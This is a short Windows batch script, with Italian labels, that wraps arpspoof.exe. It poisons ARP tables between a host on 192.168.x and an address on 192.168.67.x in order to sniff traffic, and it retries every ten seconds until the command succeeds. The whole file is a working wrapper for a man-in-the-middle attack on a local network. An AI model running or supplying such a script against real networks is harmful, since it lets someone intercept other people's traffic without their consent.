@echo off
title sniffing %1 [192.168.%2] verso indirizzo 192.168.67.%4

:ripeti
for /f %%i in ('time /t') do set ts=%%i
echo %ts% arpspoof.exe -i \Device\NPF_{98FF2EC7-E759-41C5-A870-B9AE696FB240} 192.168.%2 192.168.67.%4
arpspoof.exe -i \Device\NPF_{98FF2EC7-E759-41C5-A870-B9AE696FB240} 192.168.%2 192.168.67.%4
if %ERRORLEVEL% EQU 0 ( goto fine_ok )

sleep 10
goto ripeti

:fine_ok
if "%~3" == "/e" (
    echo attesa di 5 secondi prima della chiusura...
    sleep 5
    exit
)
